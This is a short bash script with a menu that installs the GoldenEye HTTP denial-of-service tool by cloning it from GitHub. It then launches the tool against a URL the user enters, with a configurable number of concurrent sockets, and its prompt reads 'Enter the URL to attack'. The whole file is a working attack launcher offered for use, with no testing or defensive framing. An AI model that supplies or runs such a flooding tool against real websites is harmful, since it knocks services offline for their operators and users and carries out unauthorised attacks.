#!/bin/bash

# Function to install GoldenEye
install_goldeneye() {
    echo "Installing GoldenEye..."
    git clone https://github.com/jseidl/GoldenEye.git
    cd GoldenEye || exit 1
    echo "GoldenEye installed successfully!"
}

# Function to run GoldenEye
run_goldeneye() {
    echo "Running GoldenEye..."
    read -rp "Enter the URL to attack: " url
    read -rp "Enter the number of concurrent sockets (default is 100): " sockets
    sockets=${sockets:-100}  # Set default value if empty
    ./goldeneye.py "$url" -s "$sockets"
}

# Main menu
while true; do
    echo "Welcome to GoldenEye Script"
    echo "1. Install GoldenEye"
    echo "2. Run GoldenEye"
    echo "3. Exit"

    read -rp "Enter your choice: " choice

    case $choice in
        1)
            install_goldeneye
            ;;
        2)
            run_goldeneye
            ;;
        3)
            echo "Exiting GoldenEye Script. Goodbye!"
            exit 0
            ;;
        *)
            echo "Invalid choice. Please enter a valid option."
            ;;
    esac
done
